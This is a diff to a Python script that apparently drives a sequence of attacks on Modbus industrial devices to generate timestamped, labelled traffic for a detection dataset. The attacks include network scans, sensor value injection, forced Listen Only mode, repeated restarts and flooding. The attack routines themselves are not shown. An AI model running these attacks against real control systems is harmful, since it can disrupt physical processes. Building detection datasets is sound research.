@@ -27,49 +27,47 @@ DOCKER_PATH = None
 # Objective 1: Reconnaissance
 def recon():
     # port/address scan
-    write_timestamp('attack0 : start')
-    ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
-    time.sleep(5)
-
-    # found Modbus devices
     write_timestamp('attack1 : start')
-    attacker.function_code_scan(ip_addresses)
+    ip_addresses = attacker.address_scan("192.168.0.0/24")
     write_timestamp('attack1 : end')
     time.sleep(5)
 
-    # device identification - function code 0x08
+    # found Modbus devices
     write_timestamp('attack2 : start')
-    attacker.device_identification_attack(ip_addresses)
+    attacker.function_code_scan(ip_addresses)
     write_timestamp('attack2 : end')
     time.sleep(5)
 
-    # naively read sensor values to find used coils/registers
+    # device identification - function code 0x08
     write_timestamp('attack3 : start')
-    attacker.naive_sensor_read(ip_addresses)
+    attacker.device_identification_attack(ip_addresses)
     write_timestamp('attack3 : end')
+    time.sleep(5)
+
+    # naively read sensor values to find used coils/registers
+    write_timestamp('attack4 : start')
+    attacker.naive_sensor_read(ip_addresses)
+    write_timestamp('attack4 : end')
 
 
 
 # Objective 2: Sporadic Injection
 def sporadic_injections():
     # port/address scan
-    write_timestamp('attack0 : start')
+    write_timestamp('attack1 : start')
     ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
+    write_timestamp('attack1 : end')
     time.sleep(5)
 
     # naively read sensor values to find used coils/registers
-    write_timestamp('attack3 : start')
+    write_timestamp('attack4 : start')
     scanned_addresses = attacker.naive_sensor_read(ip_addresses)
-    write_timestamp('attack3 : end')
-
-    print(scanned_addresses)
+    write_timestamp('attack4 : end')
 
     # inject values sporadically to all found devices
-    write_timestamp('attack4 : start')
+    write_timestamp('attack5 : start')
     attacker.sporadic_sensor_measurement_injection(ip_addresses, scanned_addresses)
-    write_timestamp('attack4 : end')
+    write_timestamp('attack5 : end')
     
     # reset damaged devices
     time.sleep(1)
@@ -82,15 +80,15 @@ def sporadic_injections():
 # Objective 3: Disable service through Force Listen Mode
 def disable_devices():
     # scan network
-    write_timestamp('attack0 : start')
+    write_timestamp('attack1 : start')
     ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
+    write_timestamp('attack1 : end')
     time.sleep(5)
 
     # force listen mode on found Modbus devices
-    write_timestamp('attack5 : start')
+    write_timestamp('attack6 : start')
     attacker.force_listen_mode(ip_addresses)
-    write_timestamp('attack5 : end')
+    write_timestamp('attack6 : end')
 
     # reset damaged devices
     time.sleep(30)
@@ -103,51 +101,57 @@ def disable_devices():
 # Objective 4: Disable service through Restart Communication
 def disable_devices_through_restarting():
     # scan network
-    write_timestamp('attack0 : start')
+    write_timestamp('attack1 : start')
     ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
+    write_timestamp('attack1 : end')
     time.sleep(5)
 
-    # send multiple Restart Communication requests (until enter key is pressed)
-    write_timestamp('attack6 : start')
+    # send multiple Restart Communication requests
+    write_timestamp('attack7 : start')
     attacker.restart_communication(ip_addresses)
-    write_timestamp('attack6 : end')
+    write_timestamp('attack7 : end')
+
+    # reset damaged devices
+    time.sleep(30)
+    write_timestamp('reset : start')
+    reset_devices(ip_addresses)
+    write_timestamp('reset : end')
 
 
 
 # Objective 5: DOS Servers
 def dos():
     # scan network
-    write_timestamp('attack0 : start')
+    write_timestamp('attack1 : start')
     ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
+    write_timestamp('attack1 : end')
     time.sleep(2)
 
     # flood with connection requests
-    write_timestamp('attack8 : start')
+    write_timestamp('attack9 : start')
     attacker.connection_flood_attack(ip_addresses)
-    write_timestamp('attack8 : end')
+    write_timestamp('attack9 : end')
     time.sleep(5)
 
-    # flood with random read requests
-    write_timestamp('attack7 : start')
+    # flood with random modbus read requests
+    write_timestamp('attack8 : start')
     attacker.data_flood_attack(ip_addresses)
-    write_timestamp('attack7 : end')
+    write_timestamp('attack8 : end')
 
 
 
 # Objective 6: Attempt to find device-related exploits
 def find_exploits():
     # address scan to find Modbus devices
-    write_timestamp('attack0 : start')
+    write_timestamp('attack1 : start')
     ip_addresses = attacker.address_scan("192.168.0.0/24")
-    write_timestamp('attack0 : end')
+    write_timestamp('attack1 : end')
     time.sleep(5)
 
     # device identification attack for device-related exploits
-    write_timestamp('attack2 : start')
+    write_timestamp('attack3 : start')
     attacker.device_identification_attack(ip_addresses)
-    write_timestamp('attack2 : end')
+    write_timestamp('attack3 : end')
 
 
 
@@ -239,7 +243,7 @@ def start_attacking():
         # extra: only perform dos attack once total to avoid data bias
         time.sleep(45)
         start_attack(dos, 6)
-        
+
         while selections:
             # perform a random attack, ensuring each attack is performed once
             selection = random.choice(selections)
